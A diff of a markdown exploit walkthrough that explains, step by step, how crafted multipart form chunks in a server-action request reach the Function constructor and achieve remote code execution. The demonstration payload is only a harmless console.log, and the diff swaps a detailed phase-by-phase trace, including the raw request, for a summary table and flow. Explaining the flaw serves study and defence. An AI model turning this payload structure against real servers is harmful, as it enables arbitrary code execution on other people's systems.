@@ -447,271 +447,70 @@ This is a JSON string that gets parsed during `initializeModelChunk`. Let's deco
 
 ## 4. Step-by-Step Execution Flow
 
-### Phase 1: Request Arrival
+> **For a detailed visual walkthrough showing PAYLOAD → CODE → BEFORE/AFTER for each step, see [payload-walkthrough.md](./payload-walkthrough.md)**
+
+### Overview
+
+The exploit executes in 13 steps:
+
+| Step | What Happens |
+|------|--------------|
+| 1 | Request arrives with malicious form data (chunks 0-4) |
+| 2 | `"0": "$1"` → Chunk 0 references Chunk 1 |
+| 3 | `"3": "[]"` → Empty array provides prototype chain access |
+| 4 | `$3:constructor:constructor` → Traverses to `Function` constructor |
+| 5 | `"2": "$@3"` → Raw Promise reference (not resolved value) |
+| 6 | `$2:then` → Gets `Chunk.prototype.then` method |
+| 7 | Chunk 1 fully resolved → Now a thenable object |
+| 8 | `await` triggers `Chunk.prototype.then` |
+| 9 | `initializeModelChunk` parses nested JSON with fake Response |
+| 10 | `$3:map` → Gets `Array.prototype.map` |
+| 11 | Outer thenable resolves → map() iterates over array-like object |
+| 12 | **`$B3` → THE RCE TRIGGER** (Blob handler with fake Response) |
+| 13 | Inner thenable resolves → **Malicious function executed!** |
+
+### High-Level Flow
 
 ```
-HTTP POST /server-action
-Content-Type: multipart/form-data
-Next-Action: <any-id>
-
-─── Form Data ───
-0: $1
-1: {"status":"resolved_model","reason":0,"_response":"$4",...}
-2: $@3
-3: []
-4: {"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}
+await chunk0
+  ↓
+chunk1.then() called (chunk1.then = Chunk.prototype.then)
+  ↓
+initializeModelChunk(chunk1) with chunk1._response = FAKE RESPONSE
+  ↓
+JSON.parse(chunk1.value) → {then: "$3:map", 0: {then: "$B3"}, length: 1}
+  ↓
+reviveModel with FAKE response resolves "$3:map" → Array.map
+  ↓
+Outer thenable.then() = Array.map.call(obj, callback)
+  ↓
+map iterates, finds {then: "$B3"} at index 0
+  ↓
+"$B3" resolved: FAKE._formData.get(FAKE._prefix + "3")
+             = Function("console.log(7*7+1)//3")
+  ↓
+Inner thenable.then() = maliciousFunction()
+  ↓
+╔═════════════════════════════════════════════════════╗
+║  ARBITRARY CODE EXECUTION ON SERVER!                ║
+╚═════════════════════════════════════════════════════╝
 ```
 
-### Phase 2: Initial Parsing
+### Key Transformations
 
 ```
-decodeReplyFromBusboy(busboy, serverModuleMap, options)
-    │
-    ├─► createResponse() creates Response object
-    │
-    ├─► For each form field:
-    │       resolveField(response, "0", "$1")
-    │       resolveField(response, "1", "{...}")
-    │       resolveField(response, "2", "$@3")
-    │       resolveField(response, "3", "[]")
-    │       resolveField(response, "4", "{...}")
-    │
-    └─► return getChunk(response, 0)
-            │
-            └─► Returns chunk 0, which references "$1"
-```
+"3": []  ─────────────────► [].constructor.constructor ───► Function
+                                   (prototype chain)
 
-### Phase 3: Chunk 0 Resolution
+"2": "$@3"  ──────────────► Chunk object (not value) ─────► Chunk.prototype
 
-```
-getChunk(response, 0)
-    │
-    │   Chunk 0 value = "$1"
-    │
-    └─► parseModelString(response, parent, key, "$1")
-            │
-            │   value[0] = '$', value[1] = '1'
-            │   This is a chunk reference
-            │
-            └─► getOrResolveChunk(response, 1)
-                    │
-                    └─► Returns chunk 1 object
-```
+"4": {_prefix, _formData} ► Fake Response object ─────────► Controls RCE
+     └─ get: "$3:c:c"
 
-### Phase 4: Chunk 1 Object Construction
+"1": {status, _response,  ► Thenable with fake Response ──► Triggers initModel
+      value, then}           └─ then = Chunk.prototype.then
 
-When chunk 1 is resolved, its properties are processed:
-
-```
-Resolving chunk 1 = {
-    'status': 'resolved_model',     ─► String, stored as-is
-    'reason': 0,                    ─► Number, stored as-is
-    '_response': '$4',              ─► Needs resolution!
-    'value': '{"then":"$3:map"...}' ─► String, stored as-is
-    'then': '$2:then'               ─► Needs resolution!
-}
-```
-
-#### Resolving `_response: '$4'`
-
-```
-parseModelString(response, chunk1, "_response", "$4")
-    │
-    └─► getOrResolveChunk(response, 4)
-            │
-            └─► Returns chunk 4 object:
-                {
-                    '_prefix': 'console.log(7*7+1)//',
-                    '_formData': {
-                        'get': <needs resolution>
-                    },
-                    '_chunks': <needs resolution>
-                }
-```
-
-#### Resolving `_formData.get: '$3:constructor:constructor'`
-
-```
-parseModelString(response, chunk4._formData, "get", "$3:constructor:constructor")
-    │
-    └─► getOutlinedModel(response, "3:constructor:constructor", ...)
-            │
-            │   path = ["3", "constructor", "constructor"]
-            │
-            ├─► getChunk(response, 3) → returns []
-            │
-            └─► Property traversal:
-                    value = []
-                    value = value["constructor"] → Array
-                    value = value["constructor"] → Function
-                    
-                    Returns: Function constructor!
-```
-
-### Phase 5: Chunk 1 Becomes Thenable
-
-After resolving `then: '$2:then'`:
-
-```
-parseModelString(response, chunk1, "then", "$2:then")
-    │
-    └─► getOutlinedModel(response, "2:then", ...)
-            │
-            │   path = ["2", "then"]
-            │
-            ├─► getChunk(response, 2)
-            │       │
-            │       │   Chunk 2 = "$@3" (Promise reference)
-            │       │
-            │       └─► parseModelString(..., "$@3")
-            │               │
-            │               │   '$@' prefix = raw chunk reference
-            │               │
-            │               └─► Returns chunk 3 as Promise-like object
-            │
-            └─► value = chunk2["then"]
-                    │
-                    └─► This is Chunk.prototype.then (the Promise then method)
-```
-
-**Result**: Chunk 1 now has:
-```javascript
-{
-    status: 'resolved_model',
-    reason: 0,
-    _response: {/* chunk 4 - fake Response */},
-    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
-    then: Chunk.prototype.then  // IT'S NOW A THENABLE!
-}
-```
-
-### Phase 6: Promise Resolution Triggers the Chain
-
-When the runtime awaits or resolves chunk 1, it detects the `then` property:
-
-```
-// JavaScript Promise resolution mechanics
-await chunk1
-    │
-    │   chunk1 has 'then' property that is a function
-    │   → JavaScript treats it as a thenable
-    │
-    └─► chunk1.then(resolve, reject)
-            │
-            │   This calls Chunk.prototype.then with chunk1 as 'this'
-            │
-            └─► Chunk.prototype.then(resolve, reject) {
-                    const chunk = this;  // chunk = chunk1
-                    
-                    switch (chunk.status) {  // status = 'resolved_model'
-                        case RESOLVED_MODEL:
-                            initializeModelChunk(chunk);  // CALLED!
-                            break;
-                    }
-                    ...
-                }
-```
-
-### Phase 7: initializeModelChunk with Attacker Control
-
-```
-initializeModelChunk(chunk1)
-    │
-    │   chunk1._response = chunk4 (our fake Response!)
-    │   chunk1.value = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
-    │
-    ├─► const resolvedModel = chunk.value;
-    │       // = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
-    │
-    ├─► const rawModel = JSON.parse(resolvedModel);
-    │       // = {then: "$3:map", 0: {then: "$B3"}, length: 1}
-    │
-    └─► reviveModel(chunk._response, {'': rawModel}, '', rawModel)
-            │
-            │   response = chunk4 (ATTACKER CONTROLLED!)
-            │
-            └─► Processes the nested JSON, resolving references
-```
-
-### Phase 8: Processing the Nested JSON
-
-```
-reviveModel processes: {then: "$3:map", 0: {then: "$B3"}, length: 1}
-    │
-    ├─► Resolving "then": "$3:map"
-    │       │
-    │       └─► getOutlinedModel(response, "3:map", ...)
-    │               │
-    │               │   path = ["3", "map"]
-    │               │
-    │               ├─► chunks[3] = []
-    │               │
-    │               └─► []["map"] = Array.prototype.map
-    │
-    │   Result: {then: [].map, 0: {then: "$B3"}, length: 1}
-    │
-    ├─► This object is THENABLE (has 'then' function)
-    │
-    └─► When this thenable resolves, .then() is called
-            │
-            └─► [].map.call({0: {then: "$B3"}, length: 1}, callback)
-                    │
-                    │   map() iterates over array-like object
-                    │
-                    └─► Processes item at index 0: {then: "$B3"}
-```
-
-### Phase 9: The Inner Thenable and RCE Trigger
-
-```
-Processing inner object: {then: "$B3"}
-    │
-    ├─► Resolving "then": "$B3"
-    │       │
-    │       └─► parseModelString(response, obj, "then", "$B3")
-    │               │
-    │               │   value[1] = 'B' → Blob handler
-    │               │
-    │               └─► case 'B': {
-    │                       const id = parseInt("3", 16);  // = 3
-    │                       const prefix = response._prefix;
-    │                           // = "console.log(7*7+1)//" (from chunk4!)
-    │                       const blobKey = prefix + id;
-    │                           // = "console.log(7*7+1)//3"
-    │                       
-    │                       return response._formData.get(blobKey);
-    │                           // response._formData.get = Function (from chunk4!)
-    │                           // 
-    │                           // This becomes:
-    │                           // Function("console.log(7*7+1)//3")
-    │                           //
-    │                           // Which creates:
-    │                           // function anonymous() {
-    │                           //     console.log(7*7+1)//3
-    │                           // }
-    │                   }
-    │
-    │   Result: {then: function(){ console.log(7*7+1)//3 }}
-    │
-    └─► This inner object is also THENABLE!
-```
-
-### Phase 10: Final Execution
-
-```
-The inner thenable {then: maliciousFunction} resolves
-    │
-    └─► JavaScript calls its .then() method
-            │
-            └─► maliciousFunction() is EXECUTED!
-                    │
-                    └─► console.log(7*7+1)  // Outputs: 50
-                            │
-                            └─► //3 is a comment, ignored
-                            
-                    ╔══════════════════════════════════════╗
-                    ║  REMOTE CODE EXECUTION ACHIEVED!     ║
-                    ╚══════════════════════════════════════╝
+"0": "$1"  ───────────────► Entry point ──────────────────► Starts chain
 ```
 
 ---
